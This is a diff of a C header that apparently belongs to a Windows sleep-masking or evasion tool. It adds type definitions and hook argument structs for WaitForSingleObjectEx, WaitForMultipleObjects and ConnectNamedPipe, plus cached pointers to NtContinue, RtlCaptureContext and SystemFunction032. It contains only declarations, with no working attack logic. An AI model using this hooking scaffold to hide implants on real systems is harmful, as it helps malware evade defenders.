@@ -403,31 +403,21 @@ typedef enum _SYSTEM_INFORMATION_CLASS
     MaxSystemInfoClass
 } SYSTEM_INFORMATION_CLASS;
 
-typedef BOOL(WINAPI *fnConnectNamedPipe)(HANDLE, LPOVERLAPPED);
-typedef BOOL(WINAPI *fnFlushFileBuffers)(HANDLE);
 typedef DWORD(WINAPI *fnWaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
+typedef DWORD(WINAPI *fnWaitForMultipleObjects)(DWORD, const HANDLE *, BOOL, DWORD);
+typedef BOOL(WINAPI* fnConnectNamedPipe)(HANDLE, LPOVERLAPPED);
 
 typedef enum _HOOK_FUNCTION {
-    SLEEP,
+    WAIT_FOR_SINGLE_OBJECT_EX,
+    WAIT_FOR_MULTIPLE_OBJECTS,
     CONNECT_NAMED_PIPE,
-    FLUSH_FILE_BUFFERS,
-    WAIT_FOR_SINGLE_OBJECT_EX
 } HOOK_TYPE;
 
-typedef struct _SLEEP_ARGS {
-    DWORD dwMilliseconds;
-} SLEEP_ARGS;
-
 typedef struct _CONNECT_NAMED_PIPE_ARGS {
-    HANDLE hNamedPipe;
+    HANDLE hPipe;
     LPOVERLAPPED lpOverlapped;
     fnConnectNamedPipe OriginalFunc;
 } CONNECT_NAMED_PIPE_ARGS;
-
-typedef struct _FLUSH_FILE_BUFFERS_ARGS {
-    HANDLE hFile;
-    fnFlushFileBuffers OriginalFunc;
-} FLUSH_FILE_BUFFERS_ARGS;
 
 typedef struct _WAIT_FOR_SINGLE_OBJECT_EX_ARGS {
     HANDLE hObject;
@@ -435,6 +425,23 @@ typedef struct _WAIT_FOR_SINGLE_OBJECT_EX_ARGS {
     BOOL bAlertable;
     fnWaitForSingleObjectEx OriginalFunc;
 } WAIT_FOR_SINGLE_OBJECT_EX_ARGS;
+
+typedef struct _WAIT_FOR_MULTIPLE_OBJECTS_ARGS {
+    DWORD nCount;
+    const HANDLE *lpHandles;
+    BOOL bWaitAll;
+    DWORD dwMilliseconds;
+    fnWaitForMultipleObjects OriginalFunc;
+    DWORD returnValue; // Store the return value of the original function for use in the hook
+} WAIT_FOR_MULTIPLE_OBJECTS_ARGS;
+
+typedef struct _HOOK_ARGS {
+    union {
+        WAIT_FOR_SINGLE_OBJECT_EX_ARGS WaitForSingleObjectExArgs;
+        WAIT_FOR_MULTIPLE_OBJECTS_ARGS WaitForMultipleObjectsArgs;
+        CONNECT_NAMED_PIPE_ARGS ConnectNamedPipeArgs;
+    };  
+} HOOK_ARGS;
 
 
 #ifndef NTSTATUS
@@ -496,3 +503,11 @@ typedef NTSTATUS (NTAPI  *fnNtContinue)(PCONTEXT, BOOLEAN);
 /* ── Globals set by setup_hooks — stores the loaded DLL image info ── */
 PVOID  g_ImageBase = NULL;
 DWORD  g_ImageSize = 0;
+
+/* ── Cached function pointers — resolved once by ResolveHookFunctions() ── */
+fnWaitForSingleObjectEx  g_pWaitForSingleObjectEx  = NULL;
+fnWaitForMultipleObjects g_pWaitForMultipleObjects = NULL;
+fnConnectNamedPipe       g_pConnectNamedPipe       = NULL;
+fnNtContinue             g_pNtContinue             = NULL;
+fnRtlCaptureContext      g_pRtlCaptureContext      = NULL;
+fnSystemFunction032      g_pSysFunc032             = NULL;
